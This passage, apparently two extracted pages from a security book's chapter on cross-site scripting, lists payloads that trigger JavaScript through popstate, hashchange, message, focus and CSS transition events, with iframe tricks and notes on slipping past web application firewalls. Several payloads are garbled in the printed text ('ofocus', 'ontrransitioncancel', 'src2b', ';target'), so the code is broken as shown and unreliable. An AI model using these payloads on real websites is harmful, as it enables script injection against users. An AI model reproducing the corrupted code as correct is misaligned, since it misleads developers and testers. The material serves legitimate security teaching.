  - '[PAGE 77]


    # Chapter eight - XSS


    ```

    <body>onpopstate=alert(1)<script>location.hash=1</script>

    ```


    ```

    <iframe src="/target?x=<body>onpopstate=print()" onload="this.src2b=''%23">

    ```


    You can use iframes again to gain modification to the hash portion of the URL
    to fire events like hashchange too:


    ```

    <iframe src="/target?x=<body>/onhashchange=print()" onload="this.src2b=''%23">

    ```


    # onmessage


    Using iframes again you can load an external URL for your injection of the onmessage
    handler and then using postMessage to fire the event:


    ```

    <iframe src="/target?x=<body>onmessage=print()" onload="this.contentWindow.postMessage(''x'',
    ''*'')">

    ```


    # ofocus


    Usually this can be fired using textarea or input using the autofocus attribute.
    It''s possible to get this event to work on other elements by using tabindexing
    and an id attribute. Tabindex is an accessibility attribute that lets you choose
    which element on the page are selected when you press tab. By combining this with
    an id attribute and using hash from the URL it will automatically focus the element:


    ```

    <x focus=alert(1) id=x tabindex=1>

    ```


    somepage.html#


    There''s another trick too, you can actually use the autofocus attribute on any
    element at least on Chrome, provided you use the tabindexing with it. This means
    you don''t need an id attribute or a hash:


    ```

    <x focus=alert(1) autofocus tabindex=1>

    ```


    Similarly there is a related event called ofocus which you can use to bypass a
    WAF and have the same behaviour described above.


    # Animation based events


    It''s quite well known that you can use CSS transitions/animations to fire events
    on any tag. If you''re not aware here''s how to do it:'
  - '[PAGE 78]


    # Chapter eight - XSS


    ```

    <style>;target {color: red;}</style>

    <xss id=x style="transition:color 10s" ontrransitioncancel=print()></xss>

    ```


    homepage.html#x

    This works by using the target selector to change the styles on the element when
    it specified in the hash partition of the URL is found. This fires the event.
    The downside with this particular approach is that it requires a style block which
    would probably be blocked by a WAF or filter. There is another way, we can use
    the trick described earlier to cover the element and Chrome adds a CSS outline
    to elements focused you can use a transition that will fire the event because
    the outline change:


    ```

    <xss id=x style="transition:outline 1s" ontrransitionend=alert(1) tabindex=1></xss>

    ```


    homepage.html#x

    If you''re having trouble sneaking that there''s always the wekit variant you
    can use:


    ```

    <xss id=x style="transition:outline 1s" onwebkittrransitionend=alert(1) tabindex=1></xss>

    ```


    homepage.html#x


    # Summary


    We covered a lot in this chapter. I basically tried to do a brain dump of obscure
    tricks I could think of or answers to questions I''ve been asked on Twitter. First
    we covered how to close scripts without a closing tag. Then covered how to abuse
    HTML comments inside scripts, HTML entities inside SVG, how to abuse window.name
    to smuggle payloads and cookies. We learnt how to use source maps to send a ping
    to an attacker controlled server. After that we demonstrated a JavaScript script
    called navigate() that works in Chrome. Next we covered all the comments in JavaScript
    and the whitespace characters. Later we showed how to use dynamic imports with
    data URLs. Afterward we covered how to get HTML inside an XML document. Then we
    showed how to use SVG uploads and use elements. After that we covered HTML entities
    and finally finished off with lesser JavaScript events.'
